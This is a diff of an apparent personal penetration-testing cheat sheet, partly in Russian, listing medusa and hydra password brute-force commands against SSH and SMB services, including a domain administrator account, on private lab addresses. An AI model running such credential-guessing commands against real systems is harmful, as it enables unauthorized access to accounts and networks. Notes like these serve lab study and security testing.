@@ -10,13 +10,13 @@ medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6
 (почему то для домена) 
 
 hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
-
+hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V
 
 !!!!Brute char!!!! -x min:max:Aa1%
 
 hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
-hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V
+
 
 метасплойт в метасплойт
 
